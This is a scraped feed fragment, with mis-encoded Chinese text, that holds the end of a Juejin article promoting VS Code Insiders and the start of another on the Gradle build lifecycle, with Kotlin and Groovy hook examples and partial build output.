<li><strong>æ‰§è¡Œå¹¶åˆ†æç»ˆç«¯å‘½ä»¤</strong></li>
<li><strong>ç®¡ç†é¡¹ç›®ç»“æ„</strong></li>
<li><strong>é‡æ„ä»£ç </strong></li>
<li><strong>æœç´¢ / æ›¿æ¢æ–‡ä»¶å†…å®¹</strong></li>
<li><strong>æ„å»º / è¿è¡Œé¡¹ç›®</strong></li>
</ul>
<p>ä½ åªéœ€è¦ä¸€å¥è¯ï¼š</p>
<blockquote>
<p>â€œå¸®æˆ‘ç»™é¡¹ç›®å¢åŠ ç”¨æˆ·ç™»å½•åŠŸèƒ½ã€‚â€</p>
</blockquote>
<p>ç„¶åå®ƒä¼šè‡ªåŠ¨æ‹†è§£æ­¥éª¤ï¼Œå¸®ä½ å®Œæˆã€‚</p>
<h3 data-id="heading-8">âœ¨ <strong>2. Notebookï¼ˆMarkdown + ä»£ç ï¼‰ä¹Ÿèƒ½ç”¨ AI è‡ªåŠ¨ç¼–è¾‘</strong></h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f18eea80317e49738bd63ab93a8a3543~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5Y-R54ix5aW96ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765780810&amp;x-signature=s2l8WVl0lKF46yFPz9J89w5FZ%2Fk%3D" alt="" loading="lazy"/></p>
<p>ä¾‹å¦‚ï¼š</p>
<ul>
<li><strong>è‡ªåŠ¨åˆ›å»º Code Cell</strong></li>
<li><strong>æ€»ç»“æ–‡ç« å†…å®¹</strong></li>
<li><strong>æ’å…¥ç¤ºä¾‹ä»£ç </strong></li>
<li><strong>è‡ªåŠ¨ä¿®å¤é”™åˆ«å­—</strong></li>
<li><strong>åšå­¦ä¹ ç¬”è®°</strong></li>
</ul>
<p>ç§‘ç ”ã€å­¦ä¹ ã€æ•°æ®åˆ†æç”¨æˆ·ç‹‚å–œï¼</p>
<h2 data-id="heading-9">ğŸ–¥ <strong>UI / UX æ›´ç°ä»£ã€æ›´ä¾¿æ·</strong></h2>
<p>ç»¿è‰²ç‰ˆå¯¹å„ç§ç»†èŠ‚éƒ½åšäº†<strong>ä½“éªŒå‡çº§</strong>ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/521d126379f64fcb98a0acc04751011f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5Y-R54ix5aW96ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765780810&amp;x-signature=D6V%2BLQ8uP6mFIqp58EgVbCuvhyA%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>Git åŒæ­¥æŒ‰é’®æ›´ç›´è§‚</strong></li>
<li><strong>æ‚¬åœä¿¡æ¯æ›´æ¸…æ™°</strong></li>
<li><strong>çŠ¶æ€æŒ‡ç¤ºæ›´ç²¾å‡†</strong></li>
<li><strong>å¸ƒå±€ä¸é…è‰²æœ‰å®éªŒæ€§æ”¹è¿›</strong></li>
</ul>
<p><strong>æ•´ä½“è§‚æ„Ÿæ¯”æ­£å¼ç‰ˆæ›´è½»ç›ˆã€ç®€æ´ã€é¡ºæ»‘ã€‚</strong></p>
<h2 data-id="heading-10">ğŸ”§ <strong>æ‰©å±•ç”Ÿæ€æ›´å¼ºï¼šæ’ä»¶ä½œè€…å¿…è£…</strong></h2>
<p>å¾ˆå¤šæ–°çš„ <strong>API</strong>ï¼ˆå¦‚ <code>Terminal API</code>ã€<code>Notebook API</code>ã€<code>Panel API</code>ï¼‰éƒ½ä¼šï¼š</p>
<p>ğŸ‘‰ <strong>å…ˆå‡ºç°åœ¨ Insiders</strong>
ğŸ‘‰ <strong>è¿‡å‡ ä¸ªæœˆå†è¿›å…¥æ­£å¼ç‰ˆ</strong></p>
<p>å¦‚æœä½ è¦å¼€å‘æˆ–æµ‹è¯• <strong>VSCode</strong> æ‰©å±•ï¼Œç»¿è‰²ç‰ˆæ˜¯å¿…å¤‡ã€‚</p>
<h2 data-id="heading-11">ğŸ“¥ <strong>å¦‚ä½•å®‰è£… VS Code ç»¿è‰²ç‰ˆï¼Ÿ</strong></h2>
<p>å®‰è£…éå¸¸ç®€å•ï¼š</p>
<p>ğŸ‘‰ <strong>å®˜æ–¹ä¸‹è½½å®‰è£…</strong>ï¼š<code>https://code.visualstudio.com/insiders</code></p>
<p>ä¼˜åŠ¿ï¼š</p>
<ul>
<li><strong>å¯ä¸æ­£å¼ç‰ˆå¹¶å­˜</strong></li>
<li><strong>ä¸å½±å“åŸç¯å¢ƒ</strong></li>
<li><strong>å¸è½½ä¸ç•™ç—•</strong></li>
<li><strong>éšæ—¶ä½“éªŒæœ€æ–°åŠŸèƒ½</strong></li>
</ul>
<h2 data-id="heading-12">âœ”ï¸ <strong>è°é€‚åˆä½¿ç”¨ VS Code ç»¿è‰²ç‰ˆï¼Ÿ</strong></h2>
<p>å¦‚æœä½ å±äºä¸‹é¢ä»»æ„ä¸€ä¸ªäººï¼Œè¯·ç«‹å³å®‰è£…ï¼š</p>
<ul>
<li><strong>å–œæ¬¢å°é²œ</strong></li>
<li><strong>é‡åº¦å‘½ä»¤è¡Œç”¨æˆ·</strong></li>
<li><strong>Copilot</strong> ç”¨æˆ·</li>
<li><strong>æ’ä»¶å¼€å‘è€…</strong></li>
<li><strong>å…³æ³¨æ•ˆç‡ &amp; æ–°æŠ€æœ¯</strong></li>
<li>æƒ³ç¬¬ä¸€æ—¶é—´ä½“éªŒ <strong>VSCode</strong> æœªæ¥æ–¹å‘</li>
</ul>
<h2 data-id="heading-13">ğŸ‰ <strong>ç»“è¯­ï¼šç»¿è‰²ç‰ˆä¸æ˜¯â€œå†…æµ‹ç©å…·â€ï¼Œè€Œæ˜¯æ›´å¼ºå¤§çš„ VSCode</strong></h2>
<p>æ€»ç»“ä¸€ä¸‹ç»¿è‰²ç‰ˆå¸¦æ¥çš„å¢å¼ºï¼š</p>





























<table><thead><tr><th>åŠŸèƒ½æ–¹å‘</th><th>æå‡</th></tr></thead><tbody><tr><td>ğŸ”¥ <strong>ç»ˆç«¯</strong></td><td>æ™ºèƒ½æç¤º + çœŸç»ˆç«¯æ¸²æŸ“</td></tr><tr><td>ğŸŒ³ <strong>Git</strong></td><td>å¯è§†åŒ– <strong>Stash</strong> ç®¡ç†</td></tr><tr><td>ğŸ¤– <strong>AI</strong></td><td><strong>Copilot</strong> è¿›å…¥è‡ªåŠ¨åŒ–æ—¶ä»£</td></tr><tr><td>ğŸ–¥ <strong>UI</strong></td><td>æ›´ç°ä»£ã€æ›´ç»†è…»</td></tr><tr><td>ğŸ§© <strong>æ’ä»¶</strong></td><td>æœ€æ–° <strong>API</strong> å…ˆä½“éªŒ</td></tr></tbody></table>
<p>ä¸€å¥è¯ï¼š<strong>VSCode Insiders æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„â€œVS Code Pro ç‰ˆâ€ã€‚</strong></p>
<p>å¦‚æœä½ è¿˜æ²¡ä½“éªŒï¼Œç°åœ¨å°±è£…ä¸€ä¸ªå§ï¼Œä½ ä¼šçˆ±ä¸Šå®ƒã€‚</p>
<ul>
<li><strong>VSCode Insiders ä¸‹è½½åœ°å€</strong>ï¼š<code>https://code.visualstudio.com/insiders</code></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android Gradle å­¦ä¹  - ç”Ÿå‘½å‘¨æœŸå’ŒTask]]></title>    <link>https://juejin.cn/post/7581036773607981056</link>    <guid>https://juejin.cn/post/7581036773607981056</guid>    <pubDate>2025-12-08T06:44:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581036773607981056" data-draft-id="7579264485259329551" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android Gradle å­¦ä¹  - ç”Ÿå‘½å‘¨æœŸå’ŒTask"/> <meta itemprop="keywords" content="gradle,Android,å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-08T06:44:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜å·"/> <meta itemprop="url" content="https://juejin.cn/user/114004941350269"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android Gradle å­¦ä¹  - ç”Ÿå‘½å‘¨æœŸå’ŒTask
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/114004941350269/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜å·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T06:44:22.000Z" title="Mon Dec 08 2025 06:44:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>â€ƒâ€ƒä¸Šä¸€ç¯‡æ–‡ç« <a href="https://juejin.cn/post/7579298511072346112" target="_blank" title="https://juejin.cn/post/7579298511072346112">Kts Gradleå­¦ä¹  </a> ä¸»è¦æ˜¯å­¦ä¹ æ–°ç‰ˆæœ¬çš„Kotlin Gradleç›¸å…³é…ç½®å’Œä»¥å‰çš„Groovyçš„ä¸åŒè¡¨ç°æ–¹å¼ï¼Œè¿™é‡Œéœ€è¦ä¸ºåè¾¹è‡ªå®šä¹‰æ’ä»¶ç¼–å†™åšå‡†å¤‡ï¼Œæ‰€ä»¥è¿˜æ˜¯è¦å­¦ä¹ ä¸‹Gradleçš„ç”Ÿå‘½å‘¨æœŸå’Œä¸€äº›å‘½ä»¤æˆ–è€…Taskçš„åŸºç¡€çŸ¥è¯† ï¼ˆpsï¼šæœ€æ—©æ˜¯20å¹´çœ‹çš„ä¸€ä¸ªå¤§ä½¬çš„æ–‡ç« å…¥é—¨ï¼Œæ—¶éš”å¤šå¹´ é‡æ–°æ•´ç†å’Œå›é¡¾ï¼Œåœ¨AIçš„å¤§æµªæ½®ä¸‹ æ²‰ä¸‹å¿ƒç¨³æ‰ç¨³æ‰“åŸºæœ¬åŠŸä¹Ÿæ˜¯å¯ä»¥çš„ï¼‰</p>
<h2 data-id="heading-1">Gradleç”Ÿå‘½å‘¨æœŸ</h2>
<p>Gradle æ„å»ºåˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼š</p>
<p><strong>åˆå§‹åŒ–é˜¶æ®µ (Initialization)</strong></p>
<ul>
<li>è¯»å– <code>settings.gradle.kts</code>æ–‡ä»¶ï¼Œç”ŸæˆSettingså¯¹è±¡ï¼Œç¡®å®šå“ªäº›é¡¹ç›®éœ€è¦å‚ä¸æ„å»ºï¼Œä¸ºéœ€è¦æ„å»ºçš„é¡¹ç›®åˆ›å»ºProjectå¯¹è±¡ï¼›</li>
</ul>
<p><strong>é…ç½®é˜¶æ®µ (Configuration)</strong></p>
<ul>
<li>é…ç½®é˜¶æ®µä¸»è¦æ˜¯è§£æ<code>build.gradle.kts</code>æ–‡ä»¶ï¼Œé…ç½®inité˜¶æ®µç”Ÿæˆçš„Projectå¯¹è±¡ï¼Œæ„å»ºæ ¹é¡¹ç›®å’Œæ‰€æœ‰å­é¡¹ç›®ï¼ŒåŒæ—¶ç”Ÿæˆå’Œé…ç½®åœ¨<code>build.gradle.kts</code>ä¸­å®šä¹‰çš„Taskå¯¹è±¡ï¼Œæ„é€ Taskçš„å…³ç³»ä¾èµ–å›¾ï¼Œå…³ç³»ä¾èµ–å›¾æ˜¯ä¸€ä¸ªæœ‰å‘æ— ç¯å›¾ï¼›</li>
</ul>
<p><strong>æ‰§è¡Œé˜¶æ®µ (Execution)</strong></p>
<ul>
<li>æ ¹æ®configureé˜¶æ®µçš„å…³ç³»ä¾èµ–å›¾æ‰§è¡ŒTask.</li>
</ul>
<h3 data-id="heading-2">ç”Ÿå‘½å‘¨æœŸé’©å­å®ä¾‹</h3>
<p>å¯ä»¥å€ŸåŠ©Gradle ç•™ç»™æˆ‘ä»¬çš„é’©å­ ï¼Œåœ¨ <code>build.gradle.kts</code> å’Œå­ä¸­ï¼Œæ¥æ‰“å°ä¸€ä¸‹ç”Ÿå‘½å‘¨æœŸï¼Œç†Ÿæ‚‰ä¸‹é’©å­çš„ä½¿ç”¨</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// é…ç½®é˜¶æ®µé’©å­</span>
beforeEvaluate {
    println(<span class="hljs-string">"3. é¡¹ç›®é…ç½®å¼€å§‹"</span>)
}

afterEvaluate {
    println(<span class="hljs-string">"4. é¡¹ç›®é…ç½®å®Œæˆ"</span>)
}

gradle.projectsEvaluated {
    println(<span class="hljs-string">"5. æ‰€æœ‰é¡¹ç›®é…ç½®å®Œæˆ"</span>)
}

<span class="hljs-comment">// æ‰§è¡Œé˜¶æ®µé’©å­</span>
gradle.taskGraph.whenReady {
    println(<span class="hljs-string">"6. Task å›¾å‡†å¤‡å®Œæˆ"</span>)
}

gradle.taskGraph.beforeTask {
    println(<span class="hljs-string">"7. Task æ‰§è¡Œå‰ï¼š<span class="hljs-variable">$path</span>"</span>)
}

gradle.taskGraph.afterTask {
    println(<span class="hljs-string">"8. Task æ‰§è¡Œåï¼š<span class="hljs-variable">$path</span>"</span>)
}

gradle.buildFinished {
    println(<span class="hljs-string">"9. æ„å»ºå®Œæˆ"</span>)
}
</code></pre>
<h3 data-id="heading-3">å·¥ç¨‹ä¸­é’©å­ä½¿ç”¨</h3>
<p><strong>æ ¹ç›®å½•ä¸‹çš„ <code>build.gradle</code> groovy æ ¼å¼</strong></p>
<pre><code class="hljs language-groovy" lang="groovy">// é’©å­3ï¼šæ¯ä¸ªé¡¹ç›®é…ç½®å¼€å§‹å‰
gradle.beforeProject { project -&gt;
    println "\n [é…ç½®é˜¶æ®µ] ${project.name} å¼€å§‹é…ç½®"
}

// é’©å­4ï¼šæ¯ä¸ªé¡¹ç›®é…ç½®å®Œæˆå
gradle.afterProject { project -&gt;
    println " [é…ç½®é˜¶æ®µ] ${project.name} é…ç½®å®Œæˆ"

    // ç»Ÿè®¡ä¿¡æ¯
    def taskCount = project.tasks.size()
    def depCount = project.configurations.size()
    println "    Tasks: ${taskCount} | Configurations: ${depCount}"
}

// é’©å­5ï¼šæ‰€æœ‰é¡¹ç›®é…ç½®å®Œæˆ
gradle.projectsEvaluated {
    println "\n [é…ç½®é˜¶æ®µ] æ‰€æœ‰é¡¹ç›®é…ç½®å®Œæˆ"

    // ç»Ÿè®¡æ‰€æœ‰é¡¹ç›®çš„ Task æ•°é‡
    def totalTasks = gradle.rootProject.allprojects.sum { it.tasks.size() }
    println "   æ€» Task æ•°é‡ï¼š${totalTasks}"
}

// é’©å­6ï¼šTask å›¾å‡†å¤‡å®Œæˆï¼ˆçŸ¥é“è¦æ‰§è¡Œå“ªäº› Taskï¼‰
gradle.taskGraph.whenReady { taskGraph -&gt;
    println "\n [æ‰§è¡Œé˜¶æ®µ] Task æ‰§è¡Œè®¡åˆ’"

    def tasks = taskGraph.allTasks
    println "å°†æ‰§è¡Œ ${tasks.size()} ä¸ª Taskï¼š\n"

    // æŒ‰é¡¹ç›®åˆ†ç»„æ˜¾ç¤º
    tasks.groupBy { it.project.name }.each { projectName, projectTasks -&gt;
        println " ${projectName}:"
        projectTasks.each { task -&gt;
            println "   âœ“ ${task.name}"
        }
        println ""
    }
}

// é’©å­7ï¼šæ¯ä¸ª Task æ‰§è¡Œå‰
gradle.taskGraph.beforeTask { task -&gt;
    println "  [æ‰§è¡Œ] å¼€å§‹ï¼š${task.path}"
}

// é’©å­8ï¼šæ¯ä¸ª Task æ‰§è¡Œå
gradle.taskGraph.afterTask { task -&gt;
    def status = task.state.failure != null ? " å¤±è´¥" : " æˆåŠŸ"
    def skipped = task.state.skipped ? " (è·³è¿‡)" : ""
    println "${status} [æ‰§è¡Œ] å®Œæˆï¼š${task.path}${skipped}"
}

// é’©å­9ï¼šæ„å»ºå®Œæˆï¼ˆæˆåŠŸæˆ–å¤±è´¥ï¼‰
gradle.buildFinished { result -&gt;
    if (result.failure != null) {
        println "\n Gradle æ„å»ºå¤±è´¥"
        println "\né”™è¯¯ï¼š${result.failure?.message}"
    } else {
        println "\n Gradle æ„å»ºæˆåŠŸ"
    }
}
</code></pre>
<p>Library æ¨¡å—<code>build.gradle.kts</code> ktsæ ¼å¼</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> projectStartTime = System.currentTimeMillis()
println(<span class="hljs-string">"\n  [<span class="hljs-subst">${project.name}</span>] é…ç½®é˜¶æ®µå¼€å§‹"</span>)

<span class="hljs-comment">// é’©å­ï¼šå½“å‰é¡¹ç›®é…ç½®å®Œæˆ</span>
afterEvaluate {
    <span class="hljs-keyword">val</span> configTime = System.currentTimeMillis() - projectStartTime
    println(<span class="hljs-string">" [<span class="hljs-subst">${project.name}</span>] é…ç½®å®Œæˆï¼Œè€—æ—¶ï¼š<span class="hljs-subst">${configTime}</span>ms"</span>)

    <span class="hljs-comment">// æ˜¾ç¤º Android é…ç½®ä¿¡æ¯</span>
    android.apply {
        println(<span class="hljs-string">"Android é…ç½®ï¼š"</span>)
        println(<span class="hljs-string">"- compileSdk: <span class="hljs-variable">$compileSdk</span>"</span>)
        println(<span class="hljs-string">"- minSdk: <span class="hljs-subst">${defaultConfig.minSdk}</span>"</span>)
        println(<span class="hljs-string">"- targetSdk: <span class="hljs-subst">${defaultConfig.targetSdk}</span>"</span>)
        println(<span class="hljs-string">"- versionCode: <span class="hljs-subst">${defaultConfig.versionCode}</span>"</span>)
        println(<span class="hljs-string">"- versionName: <span class="hljs-subst">${defaultConfig.versionName}</span>"</span>)
    }
}

<span class="hljs-comment">// Task çº§åˆ«ç›‘æ§ï¼ˆå¸¦æ€§èƒ½åˆ†æï¼‰</span>

tasks.configureEach {
    doFirst {
        <span class="hljs-comment">// è®°å½•æ¯ä¸ª Task çš„å¼€å§‹æ—¶é—´</span>
        ext.<span class="hljs-keyword">set</span>(<span class="hljs-string">"taskStartTime"</span>, System.currentTimeMillis())
        println(<span class="hljs-string">"[<span class="hljs-variable">$path</span>] ä»»åŠ¡å¼€å§‹æ‰§è¡Œ..."</span>)
    }

    doLast {
        <span class="hljs-comment">// è®¡ç®—æ¯ä¸ª Task çš„è€—æ—¶</span>
        <span class="hljs-keyword">val</span> start = ext.<span class="hljs-keyword">get</span>(<span class="hljs-string">"taskStartTime"</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">Long</span>
        <span class="hljs-keyword">val</span> duration = System.currentTimeMillis() - start

        <span class="hljs-comment">// æ ¹æ®è€—æ—¶åˆ†ç±»</span>
        <span class="hljs-keyword">val</span> mm = <span class="hljs-keyword">when</span> {
            duration &gt; <span class="hljs-number">5000</span> -&gt; <span class="hljs-string">"åƒåœ¾é€Ÿåº¦"</span>
            duration &gt; <span class="hljs-number">2000</span> -&gt; <span class="hljs-string">"æ­£å¸¸é€Ÿåº¦"</span> 
            duration &gt; <span class="hljs-number">1000</span> -&gt; <span class="hljs-string">"é£é€Ÿé€Ÿåº¦"</span> 
            duration &gt; <span class="hljs-number">0</span> -&gt; <span class="hljs-string">"é—ªç”µé€Ÿåº¦"</span> 
            <span class="hljs-keyword">else</span> -&gt; <span class="hljs-string">" ï¼Ÿï¼Ÿï¼Ÿ "</span>
        }

        println(<span class="hljs-string">"<span class="hljs-variable">$mm</span> [<span class="hljs-variable">$path</span>] ä»»åŠ¡å®Œæˆï¼Œè€—æ—¶ï¼š<span class="hljs-subst">${duration}</span>ms"</span>)

        <span class="hljs-keyword">if</span> (duration &gt; <span class="hljs-number">5000</span>) {
            println(<span class="hljs-string">"è­¦å‘Šï¼šä»»åŠ¡è€—æ—¶è¿‡é•¿ï¼Œå»ºè®®ä¼˜åŒ–ï¼"</span>)
        }
    }
}

<span class="hljs-comment">// ç‰¹å®š Task çš„é’©å­</span>

<span class="hljs-comment">// ç›‘æ§ç¼–è¯‘ Task</span>
tasks.withType&lt;org.jetbrains.kotlin.gradle.tasks.KotlinCompile&gt;().configureEach {
    doFirst {
        println(<span class="hljs-string">"Kotlin ç¼–è¯‘å¼€å§‹..."</span>)
    }
    doLast {
        println(<span class="hljs-string">"Kotlin ç¼–è¯‘å®Œæˆ"</span>)
    }
}

<span class="hljs-comment">// ç›‘æ§æ‰“åŒ… Taskï¼ˆLibrary æ¨¡å—ä½¿ç”¨ bundleDebugAarï¼‰</span>

tasks.matching { it.name == <span class="hljs-string">"bundleDebugAar"</span> }.configureEach {
    doFirst {
        println(<span class="hljs-string">"\n å¼€å§‹æ‰“åŒ… Debug AAR..."</span>)
    }
    doLast {
        println(<span class="hljs-string">" Debug AAR æ‰“åŒ…å®Œæˆï¼"</span>)

        <span class="hljs-comment">// æ˜¾ç¤º AAR ä¿¡æ¯</span>
        <span class="hljs-keyword">val</span> aarDir = File(layout.buildDirectory.asFile.<span class="hljs-keyword">get</span>(), <span class="hljs-string">"outputs/aar"</span>)
        <span class="hljs-keyword">if</span> (aarDir.exists()) {
            aarDir.listFiles()?.forEach { aar -&gt;
                <span class="hljs-keyword">if</span> (aar.extension == <span class="hljs-string">"aar"</span>) {
                    <span class="hljs-keyword">val</span> size = aar.length() / <span class="hljs-number">1024.0</span> / <span class="hljs-number">1024.0</span>
                    println(<span class="hljs-string">"AAR: <span class="hljs-subst">${aar.name}</span>"</span>)
                    println(<span class="hljs-string">"å¤§å°: <span class="hljs-subst">${<span class="hljs-string">"%.2f"</span>.format(size)}</span> MB"</span>)
                }
            }
        }
    }
}

tasks.matching { it.name == <span class="hljs-string">"bundleReleaseAar"</span> }.configureEach {
    doFirst {
        println(<span class="hljs-string">"\n å¼€å§‹æ‰“åŒ… Release AAR..."</span>)
    }
    doLast {
        println(<span class="hljs-string">" Release AAR æ‰“åŒ…å®Œæˆï¼"</span>)
        
        <span class="hljs-comment">// æ˜¾ç¤º AAR ä¿¡æ¯</span>
        <span class="hljs-keyword">val</span> aarDir = File(layout.buildDirectory.asFile.<span class="hljs-keyword">get</span>(), <span class="hljs-string">"outputs/aar"</span>)
        <span class="hljs-keyword">if</span> (aarDir.exists()) {
            aarDir.listFiles()?.forEach { aar -&gt;
                <span class="hljs-keyword">if</span> (aar.extension == <span class="hljs-string">"aar"</span>) {
                    <span class="hljs-keyword">val</span> size = aar.length() / <span class="hljs-number">1024.0</span> / <span class="hljs-number">1024.0</span>
                    println(<span class="hljs-string">"AAR: <span class="hljs-subst">${aar.name}</span>"</span>)
                    println(<span class="hljs-string">"å¤§å°: <span class="hljs-subst">${<span class="hljs-string">"%.2f"</span>.format(size)}</span> MB"</span>)
                }
            }
        }
    }
}
</code></pre>
<p>æŸ¥çœ‹gradle è¿è¡Œç»“æœå¯è§</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">Starting</span> <span class="hljs-string">Gradle</span> <span class="hljs-string">Daemon...</span>
<span class="hljs-string">Gradle</span> <span class="hljs-string">Daemon</span> <span class="hljs-string">started</span> <span class="hljs-string">in</span> <span class="hljs-number">854</span> <span class="hljs-string">ms</span>

<span class="hljs-string">&gt;</span> <span class="hljs-attr">Configure project :</span>
 [<span class="hljs-string">é…ç½®é˜¶æ®µ</span>] <span class="hljs-string">GradleY</span> <span class="hljs-string">é…ç½®å®Œæˆ</span>
    <span class="hljs-attr">Tasks:</span> <span class="hljs-number">17</span> <span class="hljs-string">|</span> <span class="hljs-attr">Configurations:</span> <span class="hljs-number">0</span>

<span class="hljs-string">&gt;</span> <span class="hljs-string">Configure</span> <span class="hljs-string">project</span> <span class="hljs-string">:app</span>

